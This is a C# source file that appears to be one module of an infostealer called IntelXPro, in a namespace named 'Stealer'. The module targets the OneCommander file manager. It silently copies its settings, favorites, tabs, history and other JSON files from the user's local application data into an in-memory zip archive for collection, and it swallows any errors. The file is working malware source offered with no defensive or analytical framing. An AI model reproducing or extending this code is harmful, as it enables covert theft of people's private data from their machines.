using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class OneCommander : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "OneCommander");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "OneCommander";

            bool foundData = false;

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "Settings.json",
                    "Favorites.json",
                    "Tabs.json",
                    "History.json"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(basePath, configFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\OneCommander\\{location}\\{configFile}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }

                string[] jsonFiles = Directory.GetFiles(basePath, "*.json", SearchOption.TopDirectoryOnly);
                
                foreach (string file in jsonFiles.Take(10))
                {
                    string fileName = Path.GetFileName(file);
                    string zipPath = $"Applications\\OneCommander\\{location}\\{fileName}";
                    zip.AddFile(zipPath, File.ReadAllBytes(file));
                    counterApplications.Files.Add(file + " => " + zipPath);
                    foundData = true;
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
